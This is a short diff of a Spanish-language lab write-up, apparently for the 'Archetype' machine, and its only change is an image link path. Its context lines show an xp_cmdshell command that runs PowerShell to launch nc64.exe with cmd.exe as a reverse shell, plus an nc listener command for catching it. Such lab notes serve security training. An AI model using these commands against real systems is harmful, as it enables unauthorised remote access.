@@ -134,7 +134,7 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 
 ``rlwrap nc -lvnp 443``  Para estar en escucha
 
-![[Imagenes/Archetype16.png]]
+![[Archetype16.png]]
 Y una vez dentro, podemos visualizar la primera flag
 
 ![[Archetype15.png]]
